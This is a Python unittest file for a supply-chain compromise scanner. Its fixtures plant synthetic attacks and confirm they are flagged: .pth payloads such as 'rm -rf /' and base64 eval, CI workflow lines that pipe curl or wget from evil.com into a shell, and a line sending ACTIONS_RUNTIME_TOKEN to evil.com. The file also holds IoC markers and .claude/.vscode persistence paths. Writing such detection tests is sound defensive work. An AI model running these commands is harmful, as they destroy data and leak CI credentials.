"""
Property tests for detect_compromise.py.

Each bypass class found during PR #44 convergence is locked in by a test
that constructs a synthetic attack and verifies the scanner catches it.
"""

from __future__ import annotations

import json
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

# Make scripts/ importable
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

import detect_compromise as dc  # noqa: E402


class _TempDirTestBase(unittest.TestCase):
    """Auto-cleans tempfile.mkdtemp() between tests.

    ignore_errors=True because a still-locked file on Windows shouldn't
    fail the assertion (Gemini medium on d53c64f noted this).
    """

    def _mkdtemp(self) -> Path:
        p = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, p, ignore_errors=True)
        return p


# ============================================================================
# Class 1: PthMultilineRegexTests
# Locks in: line-2 payloads, exec/subprocess variants, subdir .pth files
# ============================================================================
class PthMultilineRegexTests(_TempDirTestBase):
    def _setup_site_packages(self, pth_name: str, content: str) -> Path:
        root = self._mkdtemp()
        sp = root / "site-packages"
        sp.mkdir()
        (sp / pth_name).write_text(content)
        return root

    def test_line2_import_payload_caught(self):
        root = self._setup_site_packages(
            "evil.pth",
            "# benign comment\nimport os; os.system('rm -rf /')\n",
        )
        findings = dc.check_pth_files(root)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].level, "ALERT")

    def test_subprocess_keyword_caught(self):
        root = self._setup_site_packages(
            "evil.pth",
            "import subprocess; subprocess.run(['curl', 'evil.com'])\n",
        )
        findings = dc.check_pth_files(root)
        self.assertEqual(len(findings), 1)

    def test_exec_keyword_caught(self):
        root = self._setup_site_packages(
            "evil.pth",
            "exec(open('/tmp/payload.py').read())\n",
        )
        findings = dc.check_pth_files(root)
        self.assertEqual(len(findings), 1)

    def test_subdir_pth_caught(self):
        root = self._mkdtemp()
        nested = root / "site-packages" / "_vendor" / "deep"
        nested.mkdir(parents=True)
        (nested / "evil.pth").write_text("import os\n")
        findings = dc.check_pth_files(root)
        self.assertEqual(len(findings), 1)

    def test_benign_first_line_does_not_save_payload(self):
        """The MULTILINE bug: a payload on line 2 was previously missed."""
        root = self._setup_site_packages(
            "tricky.pth",
            "# this looks fine\n"
            "# more comment\n"
            "import sys; sys.path.insert(0, '/evil')\n",
        )
        findings = dc.check_pth_files(root)
        self.assertEqual(len(findings), 1)

    def test_eval_keyword_caught(self):
        root = self._setup_site_packages(
            "evil.pth",
            "eval(__import__('base64').b64decode('cm0gLXJmIC8='))\n",
        )
        findings = dc.check_pth_files(root)
        self.assertEqual(len(findings), 1)


# ============================================================================
# Class 2: PthAllowlistTamperTests
# Locks in: prefix-match bypass; trailing-newline edge case
# ============================================================================
class PthAllowlistTamperTests(_TempDirTestBase):
    def test_prefix_match_bypass_blocked(self):
        """Attacker prepends legit shim text and appends payload.
        Previous (broken) version used prefix match and let this through."""
        root = self._mkdtemp()
        sp = root / "site-packages"
        sp.mkdir()
        # Allowlisted prefix + appended payload
        (sp / "fake-legit.pth").write_text(
            "import sys; sys.__plen = len(sys.path)\n"
            "import os; os.system('evil')\n"
        )
        findings = dc.check_pth_files(root)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].level, "ALERT")

    def test_exact_legit_setuptools_shim_passes(self):
        root = self._mkdtemp()
        sp = root / "site-packages"
        sp.mkdir()
        (sp / "setuptools.pth").write_text("import sys; sys.__plen = len(sys.path)\n")
        findings = dc.check_pth_files(root)
        self.assertEqual(len(findings), 0)

    def test_empty_pth_passes(self):
        root = self._mkdtemp()
        sp = root / "site-packages"
        sp.mkdir()
        (sp / "empty.pth").write_text("\n")
        findings = dc.check_pth_files(root)
        self.assertEqual(len(findings), 0)


# ============================================================================
# Class 3: CompromisedPyPIRegexTests
# Locks in: every PEP 508 form (extras, markers, direct refs, comments, whitespace)
# ============================================================================
class CompromisedPyPIRegexTests(_TempDirTestBase):
    def _scan_req(self, content: str, name: str = "requirements.txt") -> list:
        root = self._mkdtemp()
        (root / name).write_text(content)
        return dc.check_compromised_pypi(root)

    def test_bare_name(self):
        f = self._scan_req("durabletask\n")
        self.assertEqual(len(f), 1)

    def test_versioned_pin(self):
        f = self._scan_req("durabletask==1.0.0\n")
        self.assertEqual(len(f), 1)

    def test_range_pin(self):
        f = self._scan_req("durabletask>=1.0,<2\n")
        self.assertEqual(len(f), 1)

    def test_extras(self):
        f = self._scan_req("durabletask[azure]\n")
        self.assertEqual(len(f), 1)

    def test_extras_with_whitespace(self):
        """r8 fix: whitespace before extras"""
        f = self._scan_req("durabletask [azure]\n")
        self.assertEqual(len(f), 1)

    def test_env_marker(self):
        """r4 fix: env marker"""
        f = self._scan_req('durabletask; python_version<"3.12"\n')
        self.assertEqual(len(f), 1)

    def test_direct_reference(self):
        """r4 fix: direct reference"""
        f = self._scan_req("durabletask @ https://files.pythonhosted.org/foo.whl\n")
        self.assertEqual(len(f), 1)

    def test_trailing_comment(self):
        """r4 fix: trailing comment"""
        f = self._scan_req("durabletask  # legacy\n")
        self.assertEqual(len(f), 1)

    def test_safe_substring_not_matched(self):
        """'durabletask-utils' contains 'durabletask' but is a different package."""
        f = self._scan_req("durabletask-utils==1.0\n")
        # The current regex requires word boundary via [=<>!~;@#] or EOL, so
        # 'durabletask-utils' should not match. (If it does, that's a bug.)
        self.assertEqual(len(f), 0)

    def test_case_insensitive(self):
        f = self._scan_req("DurableTask==1.0\n")
        self.assertEqual(len(f), 1)

    def test_multiple_lines_each_match(self):
        f = self._scan_req(
            "fast-agent-mcp\n"
            "durabletask==1.0\n"
            "requests>=2\n"
        )
        self.assertEqual(len(f), 2)


# ============================================================================
# Class 4: CompromisedPyPIExcludePathsTests
# Locks in: Path.parts vs substring exclusion
# ============================================================================
class CompromisedPyPIExcludePathsTests(_TempDirTestBase):
    def test_venv_substring_in_dirname_not_skipped(self):
        """Path.parts-based exclusion: 'my-venv-project' contains 'venv' as
        a substring but is not a venv. Should still be scanned."""
        root = self._mkdtemp()
        proj = root / "my-venv-project"
        proj.mkdir()
        (proj / "requirements.txt").write_text("durabletask\n")
        f = dc.check_compromised_pypi(root)
        self.assertEqual(len(f), 1)

    def test_actual_venv_subdir_skipped(self):
        """A real .venv directory should be skipped."""
        root = self._mkdtemp()
        venv = root / ".venv"
        venv.mkdir()
        (venv / "requirements.txt").write_text("durabletask\n")
        f = dc.check_compromised_pypi(root)
        self.assertEqual(len(f), 0)

    def test_site_packages_skipped(self):
        root = self._mkdtemp()
        sp = root / "lib" / "site-packages"
        sp.mkdir(parents=True)
        (sp / "requirements.txt").write_text("durabletask\n")
        f = dc.check_compromised_pypi(root)
        self.assertEqual(len(f), 0)


# ============================================================================
# Class 5: WorkflowScanCoverageTests
# Locks in: sudo, eval, abs-paths, version suffix, multi-pipe
# ============================================================================
class WorkflowScanCoverageTests(_TempDirTestBase):
    def _setup_workflow(self, content: str) -> Path:
        root = self._mkdtemp()
        wf = root / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text(content)
        return root

    def test_basic_curl_pipe_bash(self):
        root = self._setup_workflow("run: curl https://evil.com | bash\n")
        self.assertEqual(len(dc.check_workflows(root)), 1)

    def test_curl_pipe_sh(self):
        root = self._setup_workflow("run: curl https://evil.com | sh\n")
        self.assertEqual(len(dc.check_workflows(root)), 1)

    def test_absolute_path_bash(self):
        """r5: absolute paths"""
        root = self._setup_workflow("run: curl https://evil.com | /bin/bash\n")
        self.assertEqual(len(dc.check_workflows(root)), 1)

    def test_sudo_basic(self):
        root = self._setup_workflow("run: curl https://evil.com | sudo bash\n")
        self.assertEqual(len(dc.check_workflows(root)), 1)

    def test_sudo_with_flags(self):
        """r8: sudo with arbitrary flags"""
        root = self._setup_workflow("run: curl https://evil.com | sudo -E -H -u root bash\n")
        self.assertEqual(len(dc.check_workflows(root)), 1)

    def test_python_version_suffix(self):
        """r8: python3.11, python3.12"""
        root = self._setup_workflow("run: curl https://evil.com | python3.11\n")
        self.assertEqual(len(dc.check_workflows(root)), 1)

    def test_multi_pipe(self):
        """r9: curl ... | grep ... | bash"""
        root = self._setup_workflow("run: curl https://evil.com | grep -v '#' | bash\n")
        self.assertEqual(len(dc.check_workflows(root)), 1)

    def test_multi_pipe_with_tee(self):
        root = self._setup_workflow("run: curl https://evil.com | tee /tmp/x | sed 's/foo/bar/' | sh\n")
        self.assertEqual(len(dc.check_workflows(root)), 1)

    def test_wget_pipe(self):
        root = self._setup_workflow("run: wget https://evil.com -O- | bash\n")
        self.assertEqual(len(dc.check_workflows(root)), 1)

    def test_base64_decode(self):
        root = self._setup_workflow("run: echo Y3VybCBldmlsLmNvbQ== | base64 -d | bash\n")
        # Either base64 -d alone or pipe-to-bash matches; we expect at least 1.
        self.assertGreaterEqual(len(dc.check_workflows(root)), 1)

    def test_eval_subshell(self):
        root = self._setup_workflow("run: eval $(curl https://evil.com)\n")
        self.assertEqual(len(dc.check_workflows(root)), 1)

    def test_runner_token_exfil(self):
        root = self._setup_workflow(
            "run: echo $ACTIONS_RUNTIME_TOKEN | curl -d @- https://evil.com\n"
        )
        self.assertEqual(len(dc.check_workflows(root)), 1)

    def test_legitimate_workflow_clean(self):
        root = self._setup_workflow(
            "run: |\n  pip install -r requirements.txt\n  pytest\n"
        )
        self.assertEqual(len(dc.check_workflows(root)), 0)

    def test_yaml_extension(self):
        """r5: also .yaml not just .yml"""
        root = self._mkdtemp()
        wf = root / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yaml").write_text("run: curl evil.com | bash\n")
        self.assertEqual(len(dc.check_workflows(root)), 1)

    def test_clean_workflow_with_safe_curl(self):
        """curl without pipe-to-shell should pass."""
        root = self._setup_workflow("run: curl -o file.tar.gz https://example.com/file.tar.gz\n")
        self.assertEqual(len(dc.check_workflows(root)), 0)


# ============================================================================
# Class 6: GitRemoteRedactionTests
# Locks in: token redact, user:pass redact, SSH passthrough, plain HTTPS passthrough
# ============================================================================
class GitRemoteRedactionTests(unittest.TestCase):
    def test_token_redacted(self):
        line = "origin\thttps://x-access-token:ghp_abc123XYZ@github.com/foo/bar.git (fetch)"
        redacted = dc._redact_remote_line(line)
        self.assertNotIn("ghp_abc123XYZ", redacted)
        self.assertIn("<REDACTED>", redacted)

    def test_user_pass_redacted(self):
        line = "origin\thttps://alice:supersecret@github.com/foo/bar.git (fetch)"
        redacted = dc._redact_remote_line(line)
        self.assertNotIn("supersecret", redacted)
        self.assertIn("<REDACTED>", redacted)

    def test_ssh_passthrough(self):
        """git@host:path has no :// and no creds — must pass through unchanged."""
        line = "origin\t" + "[email protected]:foo/bar.git (fetch)"
        self.assertEqual(dc._redact_remote_line(line), line)

    def test_plain_https_passthrough(self):
        """Unauthenticated HTTPS has no @ in authority — must pass unchanged."""
        line = "origin\thttps://github.com/foo/bar.git (fetch)"
        self.assertEqual(dc._redact_remote_line(line), line)


# ============================================================================
# Class 7 (NEW): PersistencePathTests
# Locks in .claude/ and .vscode/ persistence detection
# ============================================================================
class PersistencePathTests(_TempDirTestBase):
    def test_claude_execution_js_alert(self):
        root = self._mkdtemp()
        (root / ".claude").mkdir()
        (root / ".claude" / "execution.js").write_text("// payload\n")
        findings = dc.check_persistence_paths(root)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].level, "ALERT")

    def test_claude_setup_mjs_alert(self):
        root = self._mkdtemp()
        (root / ".claude").mkdir()
        (root / ".claude" / "setup.mjs").write_text("// loader\n")
        findings = dc.check_persistence_paths(root)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].level, "ALERT")

    def test_vscode_setup_mjs_alert(self):
        root = self._mkdtemp()
        (root / ".vscode").mkdir()
        (root / ".vscode" / "setup.mjs").write_text("// loader\n")
        findings = dc.check_persistence_paths(root)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].level, "ALERT")

    def test_claude_settings_with_hook_warns(self):
        """Legitimate .claude/settings.json is fine; only flag if it has the
        SessionStart_hook IoC keyword."""
        root = self._mkdtemp()
        (root / ".claude").mkdir()
        (root / ".claude" / "settings.json").write_text(
            '{"SessionStart_hook": "/tmp/payload"}\n')
        findings = dc.check_persistence_paths(root)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].level, "WARN")

    def test_claude_settings_without_keyword_clean(self):
        """A legitimate .claude/settings.json should not trigger."""
        root = self._mkdtemp()
        (root / ".claude").mkdir()
        (root / ".claude" / "settings.json").write_text(
            '{"model": "claude-3-5-sonnet", "theme": "dark"}\n')
        findings = dc.check_persistence_paths(root)
        self.assertEqual(len(findings), 0)

    def test_format_check_workflow_warns(self):
        root = self._mkdtemp()
        wf = root / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "format-check.yml").write_text("name: format\n")
        findings = dc.check_persistence_paths(root)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].level, "WARN")


# ============================================================================
# Class 8 (NEW): SpoofedCommitTests
# ============================================================================
class SpoofedCommitTests(_TempDirTestBase):
    def _init_repo_with_commit(self, root: Path, email: str) -> None:
        """Create a git repo with one commit by the given author email."""
        subprocess.run(["git", "init", "-q"], cwd=root, check=True)
        subprocess.run(["git", "config", "user.email", email], cwd=root, check=True)
        subprocess.run(["git", "config", "user.name", "test"], cwd=root, check=True)
        subprocess.run(["git", "config", "commit.gpgsign", "false"], cwd=root, check=True)
        (root / "f.txt").write_text("hi\n")
        subprocess.run(["git", "add", "f.txt"], cwd=root, check=True)
        subprocess.run(["git", "commit", "-q", "-m", "test"], cwd=root, check=True)

    def test_claude_spoofed_author_warns(self):
        root = self._mkdtemp()
        try:
            self._init_repo_with_commit(root, "claude@users.noreply.github.com")
        except (FileNotFoundError, subprocess.CalledProcessError):
            self.skipTest("git not available")
        findings = dc.check_spoofed_commits(root)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].level, "WARN")

    def test_normal_author_clean(self):
        root = self._mkdtemp()
        try:
            self._init_repo_with_commit(root, "[email protected]")
        except (FileNotFoundError, subprocess.CalledProcessError):
            self.skipTest("git not available")
        findings = dc.check_spoofed_commits(root)
        self.assertEqual(len(findings), 0)


# ============================================================================
# Class 9 (NEW): CampaignMarkerTests
# ============================================================================
class CampaignMarkerTests(_TempDirTestBase):
    def test_resistance_marker_alert(self):
        root = self._mkdtemp()
        (root / "evil.js").write_text(
            "// some code\nconst x = 'LongLiveTheResistanceAgainstMachines';\n"
        )
        findings = dc.check_campaign_markers(root)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].level, "ALERT")
        self.assertEqual(findings[0].details["line"], 2)

    def test_mini_shai_hulud_appeared_marker_alert(self):
        root = self._mkdtemp()
        (root / "README.md").write_text("# A Mini Shai-Hulud has Appeared\n")
        findings = dc.check_campaign_markers(root)
        self.assertEqual(len(findings), 1)

    def test_scanner_files_skipped(self):
        """The scanner's own files contain IoC strings — they must not self-match."""
        root = self._mkdtemp()
        (root / "scripts").mkdir()
        (root / "scripts" / "shai-hulud-audit.sh").write_text(
            "# This is an audit script that lists IOCs including:\n"
            "# - LongLiveTheResistanceAgainstMachines\n"
        )
        findings = dc.check_campaign_markers(root)
        self.assertEqual(len(findings), 0)

    def test_clean_file_no_finding(self):
        root = self._mkdtemp()
        (root / "ok.py").write_text("print('hello world')\n")
        findings = dc.check_campaign_markers(root)
        self.assertEqual(len(findings), 0)


# ============================================================================
# Class 10 (NEW): CompromisedNpmTests
# ============================================================================
class CompromisedNpmTests(_TempDirTestBase):
    def test_package_json_compromised_dep_alert(self):
        root = self._mkdtemp()
        (root / "package.json").write_text(json.dumps({
            "name": "test", "version": "1.0.0",
            "dependencies": {"mbt": "1.2.48"}
        }))
        findings = dc.check_compromised_npm(root)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].level, "ALERT")

    def test_package_json_safe_version_warns(self):
        """A range that might include a bad version: warn but don't alert."""
        root = self._mkdtemp()
        (root / "package.json").write_text(json.dumps({
            "name": "test",
            "dependencies": {"mbt": "^1.2.0"}
        }))
        findings = dc.check_compromised_npm(root)
        # Range '^1.2.0' could resolve to 1.2.48 — we warn
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].level, "WARN")

    def test_package_lock_compromised_alert(self):
        root = self._mkdtemp()
        (root / "package-lock.json").write_text(json.dumps({
            "name": "test", "lockfileVersion": 3,
            "packages": {
                "node_modules/@cap-js/sqlite": {
                    "version": "2.2.2", "resolved": "..."
                }
            }
        }))
        findings = dc.check_compromised_npm(root)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].level, "ALERT")

    def test_unrelated_package_clean(self):
        root = self._mkdtemp()
        (root / "package.json").write_text(json.dumps({
            "name": "test",
            "dependencies": {"lodash": "^4.17.21"}
        }))
        findings = dc.check_compromised_npm(root)
        self.assertEqual(len(findings), 0)

    def test_node_modules_excluded(self):
        """package.json inside node_modules shouldn't be scanned."""
        root = self._mkdtemp()
        nm = root / "node_modules" / "mbt"
        nm.mkdir(parents=True)
        (nm / "package.json").write_text(json.dumps({
            "name": "mbt", "version": "1.2.48"
        }))
        findings = dc.check_compromised_npm(root)
        # Self-referential package.json inside node_modules is not the IoC
        self.assertEqual(len(findings), 0)


# ============================================================================
# Class 11 (NEW): SarifOutputTests
# ============================================================================
class SarifOutputTests(_TempDirTestBase):
    def test_sarif_structure(self):
        finding = dc.Finding(
            section="pypi", type="compromised_dependency", level="ALERT",
            message="test message",
            details={"package": "durabletask", "file": "/repo/requirements.txt",
                     "line": 5}
        )
        root = self._mkdtemp()
        sarif = dc.to_sarif([finding], root)
        self.assertEqual(sarif["version"], "2.1.0")
        self.assertEqual(len(sarif["runs"]), 1)
        self.assertEqual(len(sarif["runs"][0]["results"]), 1)
        self.assertEqual(sarif["runs"][0]["results"][0]["level"], "error")

    def test_sarif_rules_deduplicated(self):
        """Two findings of same type produce one rule entry."""
        findings = [
            dc.Finding(section="pypi", type="compromised_dependency",
                       level="ALERT", message="m1", details={"file": "/r/a.txt"}),
            dc.Finding(section="pypi", type="compromised_dependency",
                       level="ALERT", message="m2", details={"file": "/r/b.txt"}),
        ]
        root = self._mkdtemp()
        sarif = dc.to_sarif(findings, root)
        rules = sarif["runs"][0]["tool"]["driver"]["rules"]
        self.assertEqual(len(rules), 1)
        self.assertEqual(len(sarif["runs"][0]["results"]), 2)

    def test_sarif_level_mapping(self):
        findings = [
            dc.Finding(section="s", type="t", level="ALERT", message="m1"),
            dc.Finding(section="s", type="u", level="WARN", message="m2"),
            dc.Finding(section="s", type="v", level="INFO", message="m3"),
        ]
        root = self._mkdtemp()
        sarif = dc.to_sarif(findings, root)
        levels = [r["level"] for r in sarif["runs"][0]["results"]]
        self.assertEqual(levels, ["error", "warning", "note"])


# ============================================================================
# Class 12: MarkerTests (existing)
# ============================================================================
class MarkerTests(unittest.TestCase):
    def test_marker_is_reversed_correctly(self):
        """The reversed marker, when reversed back, should equal the IoC string."""
        self.assertEqual(dc.MARKER_REVERSED[::-1], "Shai-Hulud: Here We Go Again")

    def test_marker_self_check_passes_when_intact(self):
        findings = dc.check_marker_self()
        self.assertEqual(len(findings), 0)


if __name__ == "__main__":
    unittest.main()
